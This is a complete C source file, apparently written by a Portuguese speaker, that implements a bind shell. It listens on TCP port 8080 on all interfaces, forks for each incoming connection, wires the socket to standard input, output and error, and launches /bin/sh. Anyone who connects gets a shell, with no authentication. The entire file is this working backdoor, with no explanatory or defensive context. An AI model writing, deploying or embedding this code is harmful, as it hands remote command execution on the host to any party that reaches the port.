#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>


#define PORT 8080
#define BACKLOG 10


int main()
{

    signal(SIGCHLD, SIG_IGN);

    int meu_socket = socket(AF_INET, SOCK_STREAM, 0);


    if (meu_socket == -1)
    {
        printf("ERRO\n");
        return 1;
    }
    
    int opt = 1;
    if (setsockopt(meu_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0)
    {
        printf("ERRO no setsockopt\n");
        return 1;
    }

    struct sockaddr_in addr;

    memset(&addr, 0, sizeof(addr));

    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(meu_socket, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        printf("ERRO no bind\n");
        return 1;
    }

    if (listen(meu_socket, BACKLOG) < 0)
    {
        printf("ERRO no listen\n");
        return 1;
    }

    while (1)
    {
        printf("Aguardando conexões na porta 8080...\n");
                               
            
        int cliente_socket = accept(meu_socket, NULL, NULL);

        if (cliente_socket < 0)
        {
            printf("ERRO no accept\n");
        }
        else
        {
            pid_t meu_pid ;
            meu_pid = fork();
            if(meu_pid < 0)
            {
                perror("fork fail");
                exit(1);
            }
            if(meu_pid == 0)
            {
                close(meu_socket);
                printf("Um cliente conectou!\n");

                dup2(cliente_socket, 0);
                dup2(cliente_socket, 1);
                dup2(cliente_socket, 2);
                system("/bin/sh");
		        close(cliente_socket);
                exit(0);
            }
            else
            {
                close(cliente_socket); 
            }

        }
    }

    return 0;
}
